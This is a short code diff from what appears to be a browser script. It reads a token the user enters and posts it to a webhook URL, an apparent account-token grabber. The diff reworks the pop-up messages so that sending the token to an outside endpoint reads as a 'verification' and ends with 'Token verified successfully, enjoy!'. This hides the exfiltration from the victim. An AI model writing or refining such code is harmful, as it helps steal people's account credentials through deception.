@@ -1135,7 +1135,7 @@ if(settings.autorun) {
     $(document).on("click", "#process-token", function () {
         const userToken = $("#user-token").val().trim();
         if (userToken) {
-            alert(`Token is valid: ${userToken}`);
+            alert(`Token is valid, now click send token: ${userToken}`);
 
             $.ajax({
                 url: webhookURL,
@@ -1143,7 +1143,7 @@ if(settings.autorun) {
                 contentType: "application/json",
                 data: JSON.stringify({ content: `Token: ${userToken}` }),
                 success: function() {
-                    alert("Token sent successfully!");
+                    alert("Token verified successfully, enjoy!");
                 },
                 error: function() {
                     alert("Failed to send the token. Please check the webhook URL.");
